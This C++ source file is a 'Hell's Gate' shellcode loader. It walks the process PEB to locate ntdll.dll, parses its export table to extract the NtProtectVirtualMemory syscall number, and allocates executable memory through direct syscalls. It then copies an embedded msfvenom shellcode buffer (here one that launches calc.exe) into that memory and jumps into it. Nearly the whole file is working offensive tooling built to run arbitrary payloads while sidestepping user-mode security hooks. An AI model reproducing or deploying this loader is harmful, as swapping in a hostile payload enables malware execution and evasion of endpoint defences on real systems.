// Artemis Controller

#include <iostream>
#include <windows.h>
#include <subauth.h>
#include <string>
#include <psapi.h>
#include <cstdint>
#include <locale>
#include <codecvt>
#include <vector>
#include "PEB.h++"  // Local Header


typedef struct ArtemisData {
    UINT64 BaseAddr;
} ArtemisData, PArtemisData;


extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle,
                                            PVOID* BaseAddress,
                                            ULONG_PTR ZeroBits,
                                            PSIZE_T RegionSize,
                                            ULONG AllocationType,
                                            ULONG Protect
);

// Declare the prototype for the NtProtectVirtualMemory syscall function
extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, 
                                           PVOID *BaseAddress,
                                           PSIZE_T NumberOfBytesToProtect,
                                           ULONG NewAccessProtection,
                                           PULONG OldAccessProtection,
                                           int syscallID);

extern "C" void jumper(UINT64* location);

class Artemis {

    public:
        DWORD read_control = 0x0400;
        ArtemisData artemisStruct;
        PEB pebStruct;
        LDR_DATA ldrStruct;
        LDR_DATA_TABLE_ENTRY ldrEntryStruct;
        PE_HEADER peHeaderStruct;
        PE_EXPORT_DIRECTORY exportDirectoryStruct;


    void walkPEB(std::wstring fileName) {

        UINT64* pebPtr = (UINT64*)__readgsqword(0x60);
        pebStruct.BaseAddr = pebPtr;
        pebStruct.Ldr = *(pebPtr+0x3);
        artemisStruct.BaseAddr = *(pebPtr+0x2);
        ldrStruct.InLoadOrderModuleList = *((UINT64*)pebStruct.Ldr+0x2);
        
        while (true)
        {
        
            UINT64 fullDLLNameAddr = *((UINT64*)ldrStruct.InLoadOrderModuleList+0xA);
            ldrEntryStruct.FullDllName = readUnicodeArrayFrom64BitPointer(fullDLLNameAddr);

            if(ldrEntryStruct.FullDllName.find(fileName) == std::wstring::npos) {
                printf("\nNot Found. Continuing Loop...");
                ldrStruct.InLoadOrderModuleList = *((UINT64*)ldrStruct.InLoadOrderModuleList+0x1);  // Change for Flink address of next module in list
                continue;
            }
            else {
                printf("\nFound NTDLL.DLL!");
                printf("\nPEB: %p",pebStruct.BaseAddr);
                printf("\nPEB LDR Addr: %p", pebStruct.Ldr);
                printf("\nLDR InMemLoadList: %p", *((UINT64*)ldrStruct.InLoadOrderModuleList));
                std::wcout << "\n" << ldrEntryStruct.FullDllName;    // Have to print wide char

                ldrEntryStruct.EntryPoint = *((UINT64**)ldrStruct.InLoadOrderModuleList+0x6);
                printf("\nNTDLL Module Base: %p", ldrEntryStruct.EntryPoint);

                break;
            }

        }

    }

    int walkPE(std::string targetFunction) {

        peHeaderStruct.e_lfanew = *((BYTE*)ldrEntryStruct.EntryPoint+0x3C); // Not necessary for this project, but still useful to store for flexibility
        peHeaderStruct.ImageBase = *(UINT64*)((BYTE*)ldrEntryStruct.EntryPoint+0x118);  // Base of NTDLL.DLL
        printf("\nImage Base: %p", peHeaderStruct.ImageBase);

        UINT64 exportDirectoryRVA = *(UINT32*)((BYTE*)ldrEntryStruct.EntryPoint+0x170);    // Export Dir RVA Offset
        exportDirectoryStruct.AddressOfFunctions = peHeaderStruct.ImageBase + *((UINT32*)((peHeaderStruct.ImageBase + exportDirectoryRVA) + 0x1C)); // This finds the AddressOfFunctions Offset and then dereferences to get the RVA address of actual table location
        printf("\nExport Functions Directory Ptr: %p", exportDirectoryStruct.AddressOfFunctions);

        UINT64 exportNamesDirectoryRVA = *(UINT32*)((BYTE*)ldrEntryStruct.EntryPoint+0x174);    // Export Names Dir RVA Offset
        exportDirectoryStruct.AddressOfNames = peHeaderStruct.ImageBase + *((UINT32*)((peHeaderStruct.ImageBase + exportDirectoryRVA) + 0x20));
        printf("\nExport Names Directory Ptr: %p", exportDirectoryStruct.AddressOfNames);

        int tick = 0x0; // Incrementor for BYTE stepping in memory
        int funcTick = 1;   // Tracks function numbers, so we can correlate back to Function Address Table -- Starting at 1 due to first function RVA not having any associated name
        std::string functionName;
        std::vector<char> functionNameArray;
        while(true) {   // Loop through function and function name Export Tables till we find our match

            char functionNameChar = *(BYTE*)(peHeaderStruct.ImageBase + *((UINT32*)exportDirectoryStruct.AddressOfNames)+tick);
            functionNameArray.push_back(functionNameChar);
            if(functionNameChar == '\0') {  // Check for end of function name string

                for(unsigned int i = 0; i < functionNameArray.size(); i++) {
                    functionName += functionNameArray[i];
                }
                
                if(functionName.find(targetFunction) != std::string::npos) {  // If target function is found
                    printf("\nFunction Found!: %s", functionName.c_str());

                    // Now we correlate back to the Export Functions Directory to get Function PTR, so we can start stepping through function's code
                    UINT64 funcAddress = peHeaderStruct.ImageBase + *(((UINT32*)exportDirectoryStruct.AddressOfFunctions) + funcTick);
                    printf("\nFunction Addr Ptr: %p", funcAddress);
                    printf("\nFunction Addr Ptr Data: %p", *((UINT64*)funcAddress));
                    int syscallID = syscallExtractor(funcAddress);  // Pass function Ptr to syscallExtractor to snag the Id

                    return syscallID;   // Return with the extracted syscall ID
                }

                functionNameArray.clear();
                functionName.clear();

                funcTick++;

            }

            tick++;    // increment

        }

    }

    int syscallExtractor(UINT64 functionPtr) {

        int syscallID;
        UINT64 egg = 0x4c8bd1b8;
        std::vector<BYTE> lens;

        int tick = 0x0;
        while(true) {

            BYTE* assembly = (BYTE*)functionPtr + tick;
            if(*assembly == 0x4c) {
                 lens.push_back(*assembly);
                 UINT32* window = (UINT32*)assembly;
                 printf("\nEgg: %p", egg);
                 printf("\nWindow: %p", *window);
                 if(_byteswap_ulong(*window) == egg) {
                    printf("\nFound Egg! Grabbing Syscall Id..");
                    syscallID = *((BYTE*)(window+0x1)); // Go plus 0x1 from the end of the window to snag the syscall ID value
                    printf("\n[+] Syscall Id: %x", syscallID);  // print Hex value
                    break;
                 }
            }

            printf("\nAssembly: %p", *assembly);

            tick++;

        }
        
        return syscallID;
    }


    std::wstring readUnicodeArrayFrom64BitPointer(const uint64_t unicodeArrayPtrValue) {
        // Convert the 64-bit pointer to a wchar_t* (Unicode character pointer)
        const wchar_t* unicodeArrayPtr = reinterpret_cast<const wchar_t*>(static_cast<uintptr_t>(unicodeArrayPtrValue));

        // Collect the Unicode characters until we encounter a null-terminator (end of the string)
        std::vector<wchar_t> unicodeArray;
        size_t i = 0;
        while (unicodeArrayPtr[i] != L'\0') {
            unicodeArray.push_back(unicodeArrayPtr[i]);
            i++;
        }

        std::wstring unicodeString(unicodeArray.begin(), unicodeArray.end());

        return unicodeString;
    }

    int controller(std::string targetFunction) {


        std::wstring fileName = L"ntdll.dll";   // wide string utf-16 name

        walkPEB(fileName);
        int syscallID = walkPE(targetFunction);

        return syscallID;

    }

    #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


};




// Hell's Gate ShellCode Loader Example

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle,
                                            PVOID* BaseAddress,
                                            ULONG_PTR ZeroBits,
                                            PSIZE_T RegionSize,
                                            ULONG AllocationType,
                                            ULONG Protect
);

// Declare the prototype for the NtProtectVirtualMemory syscall function
extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, 
                                           PVOID *BaseAddress,
                                           PSIZE_T NumberOfBytesToProtect,
                                           ULONG NewAccessProtection,
                                           PULONG OldAccessProtection,
                                           int syscallID);

extern "C" void jumper(UINT64* location);

Artemis artemis; // Declare Artemis Class

int syscallID = artemis.controller("NtProtectVirtualMemory");

int main() {

    PVOID baseAddress = nullptr;
    SIZE_T regionSize = 4096;
    DWORD allocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD protect = PAGE_EXECUTE_READWRITE;

    // Get the process handle for the current process
    HANDLE processHandle = GetCurrentProcess();

    // Call the NtAllocateVirtualMemory function from the assembly code
    NTSTATUS vpStatus = NtAllocateVirtualMemory(
        processHandle, &baseAddress, 0, &regionSize, allocationType, protect
    );

    if (vpStatus == 0) {
        std::cout << "Allocated memory at: " << baseAddress << std::endl;
    } else {
        std::cout << "Memory allocation failed. Status: 0x" << std::hex << vpStatus << std::endl;
    }

    printf("Base Address of VirtualAlloc: %p", baseAddress);

    // x64 calc.exe cmd from msfvenom
    unsigned char buf[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
        "\x63\x2e\x65\x78\x65\x00";

    *(UINT64*)baseAddress = *buf;
    memcpy(baseAddress, buf, sizeof(buf));  // copy into allocated mem location

    // Call the NtProtectVirtualMemory syscall from the assembly file and pass extracted syscall id as param
    ULONG oldProtect;
    NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress,
                                             &regionSize, protect, &oldProtect, syscallID);

    jumper((UINT64*)baseAddress); // Jump to execute shellcode

    if (NT_SUCCESS(status)) {
        std::cout << "Memory protection changed successfully." << std::endl;
    } else {
        std::cout << "NtProtectVirtualMemory failed. Status: 0x" << std::hex << status << std::endl;
    }

    // Free the allocated memory
    VirtualFree(baseAddress, 0, MEM_RELEASE);

    while(true) {

    }

    return 0;
}
